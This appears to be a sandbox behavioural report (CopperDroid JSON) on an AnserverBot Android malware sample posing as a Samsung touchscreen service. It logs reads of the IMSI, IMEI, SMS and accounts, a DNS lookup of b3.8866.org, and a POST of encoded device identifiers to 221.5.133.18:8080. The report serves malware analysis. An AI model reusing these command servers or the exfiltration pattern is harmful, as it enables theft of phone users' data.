{"behaviors": {"static": {}, "dynamic": {"host": [{"tid": 326, "procname": "Thread-8", "class": "FS ACCESS", "low": [{"sysname": "open", "blob": "{'flags': 131649, 'mode': 384, 'filename': u'/data/data/com.sec.android.touchScreen.server/shared_prefs/210.xml\\x00'}", "type": "SYSCALL", "id": 1393, "ts": 0}, {"sysname": "write", "xref": 1393, "ts": 0, "blob": "{'filename': u'/data/data/com.sec.android.touchScreen.server/shared_prefs/210.xml'}", "type": "SYSCALL", "id": 1395}]}, {"tid": 326, "procname": "Thread-8", "class": "FS ACCESS", "low": [{"sysname": "open", "blob": "{'flags': 131649, 'mode': 384, 'filename': u'/data/data/com.sec.android.touchScreen.server/shared_prefs/210.xml\\x00'}", "type": "SYSCALL", "id": 1403, "ts": 0}, {"sysname": "write", "xref": 1403, "ts": 0, "blob": "{'filename': u'/data/data/com.sec.android.touchScreen.server/shared_prefs/210.xml'}", "type": "SYSCALL", "id": 1404}]}, {"tid": 326, "procname": "Thread-8", "class": "FS ACCESS", "low": [{"sysname": "open", "blob": "{'flags': 131649, 'mode': 384, 'filename': u'/data/data/com.sec.android.touchScreen.server/shared_prefs/210.xml\\x00'}", "type": "SYSCALL", "id": 1413, "ts": 0}, {"sysname": "write", "xref": 1413, "ts": 0, "blob": "{'filename': u'/data/data/com.sec.android.touchScreen.server/shared_prefs/210.xml'}", "type": "SYSCALL", "id": 1414}]}, {"tid": 330, "procname": "Thread-9", "class": "ACCESS PERSONAL INFO", "subclass": "PHONE", "low": [{"method_name": "com.android.internal.telephony.IPhoneSubInfo.getSubscriberId()()", "type": "BINDER", "id": 1551, "ts": 0}]}, {"tid": 330, "procname": "Thread-9", "class": "ACCESS PERSONAL INFO", "subclass": "PHONE", "low": [{"method_name": "com.android.internal.telephony.IPhoneSubInfo.getDeviceId()()", "type": "BINDER", "id": 1560, "ts": 0}]}, {"tid": 330, "procname": "Thread-9", "class": "FS ACCESS", "low": [{"sysname": "open", "blob": "{'flags': 131649, 'mode': 384, 'filename': u'/data/data/com.sec.android.touchScreen.server/shared_prefs/0.xml\\x00'}", "type": "SYSCALL", "id": 1564, "ts": 0}, {"sysname": "write", "xref": 1564, "ts": 0, "blob": "{'filename': u'/data/data/com.sec.android.touchScreen.server/shared_prefs/0.xml'}", "type": "SYSCALL", "id": 1565}]}, {"tid": 330, "procname": "Thread-9", "class": "NETWORK ACCESS", "subclass": "DNS", "low": [{"sysname": "connect", "blob": "{'host': '10.0.2.3', 'retval': 0, 'port': 53}", "type": "SYSCALL", "id": 1735, "ts": 0}, {"sysname": "sendto", "xref": 1735, "ts": 0, "blob": "{'query_data': 'b3.8866.org. 1 1'}", "type": "SYSCALL", "id": 1736}]}, {"tid": 330, "procname": "Thread-9", "class": "NETWORK ACCESS", "low": [{"sysname": "connect", "blob": "{'host': '::ffff:221.5.133.18', 'retval': -115, 'port': 8080}", "type": "SYSCALL", "id": 1764, "ts": 0}, {"sysname": "sendto", "xref": 1764, "ts": 0, "blob": "=%7B%27destination%27%3A+%27%3A%3Affff%3A221.5.133.18+%27%2C+%27data%27%3A+%27POST+%2Fjk2.action%3Fa%3D310260000000000%26a1%3DfNjYfw7YfJSYfJSYfJSY%26c%3D41%26c1%3D0Jj_%26d%3D2.2.3%26d1%3DfWQ29wf_%26e%3Dunknown%26e1%3DuxBm8IM48n__%26f%3Dgeneric%26f1%3DzC3OzKF17Y__%26g%3D8%26g1%3DPS__%26h%3D000000000000000%26h1%3DfJSYfJSYfJSYfJSYfJSY%26i%3D8%26i1%3DPS__%26j%3D0%26j1%3DfS__%26k%3D0%26k1%3DfS__%26l%3D0%26l1%3DfS__%26m%3D0%26m1%3DfS__%26n%3D0%26n1%3DfS__%26p%3Dcom.sec.android.touchScreen.server%26p1%3D7CMg9e0R72B58Ii28CRD9eihux0byC02zx3O9e0RrezRrn__%26key%3DfqfpfNVY0wysfqfCfl__+HTTP%2F1.1%5Cr%5CnUser-Agent%3A+Dalvik%2F1.2.0+%28Linux%3B+U%3B+Android+2.2.3%3B+generic+Build%2FFRK76C%29%5Cr%5CnHost%3A+b3.8866.org%3A8080%5Cr%5CnConnection%3A+Keep-Alive%5Cr%5Cn%5Cr%5Cn%27%2C+%27dest-port%27%3A+8080%7D", "type": "SYSCALL", "id": 1773}]}, {"tid": 330, "procname": "Thread-9", "class": "FS ACCESS", "low": [{"sysname": "open", "blob": "{'flags': 131649, 'mode': 384, 'filename': u'/data/data/com.sec.android.touchScreen.server/shared_prefs/21.xml\\x00'}", "type": "SYSCALL", "id": 1950, "ts": 0}, {"sysname": "write", "xref": 1950, "ts": 0, "blob": "{'filename': u'/data/data/com.sec.android.touchScreen.server/shared_prefs/21.xml'}", "type": "SYSCALL", "id": 1951}]}, {"tid": 330, "procname": "Thread-9", "class": "FS ACCESS", "low": [{"sysname": "open", "blob": "{'flags': 131649, 'mode': 384, 'filename': u'/data/data/com.sec.android.touchScreen.server/shared_prefs/21.xml\\x00'}", "type": "SYSCALL", "id": 1960, "ts": 0}, {"sysname": "write", "xref": 1960, "ts": 0, "blob": "{'filename': u'/data/data/com.sec.android.touchScreen.server/shared_prefs/21.xml'}", "type": "SYSCALL", "id": 1964}]}, {"tid": 330, "procname": "Thread-9", "class": "FS ACCESS", "low": [{"sysname": "open", "blob": "{'flags': 131649, 'mode': 384, 'filename': u'/data/data/com.sec.android.touchScreen.server/shared_prefs/210.xml\\x00'}", "type": "SYSCALL", "id": 1973, "ts": 0}, {"sysname": "write", "xref": 1973, "ts": 0, "blob": "{'filename': u'/data/data/com.sec.android.touchScreen.server/shared_prefs/210.xml'}", "type": "SYSCALL", "id": 1974}]}, {"tid": 77, "procname": "ActivityManager", "class": "ACCESS PERSONAL INFO", "subclass": "SMS", "low": [{"recv by": "com.sec.android.touchScreen.server", "intent": "android.provider.Telephony.SMS_RECEIVED", "type": "INTENT", "id": 2559, "ts": 0}]}, {"tid": 118, "procname": "Binder Thread #", "class": "ACCESS PERSONAL INFO", "subclass": "SMS", "low": [{"recv by": "com.sec.android.touchScreen.server", "intent": "android.provider.Telephony.SMS_RECEIVED", "type": "INTENT", "id": 2632, "ts": 0}]}, {"tid": 351, "procname": "d.process.acore", "class": "ACCESS PERSONAL INFO", "subclass": "ACCOUNT", "low": [{"method_name": "android.accounts.IAccountManager.TRANSACTION_getAccounts()", "type": "BINDER", "id": 3845, "ts": 0}]}, {"tid": 356, "procname": "Binder Thread #", "class": "ACCESS PERSONAL INFO", "subclass": "ACCOUNT", "low": [{"method_name": "android.accounts.IAccountManager.TRANSACTION_getAccountsByFeatures()", "type": "BINDER", "id": 4444, "ts": 0}]}]}}, "userid": "joystick", "country": "UNAVAILABLE", "date_end": "N/A", "date_start": "N/A", "date_submitted": "2012-11-19 17:59:09", "static": "/copperdroid/reports//AnserverBot_genome_stimulated/753073a72bc14ee1590e8addd6cb6eeb0a0602f1.apk.log", "submitter_ip": "127.0.0.1", "pcap": "/copperdroid/reports//AnserverBot_genome_stimulated/753073a72bc14ee1590e8addd6cb6eeb0a0602f1.apk.pcap", "md5": "164a147b663248558e4b6a287a429139"}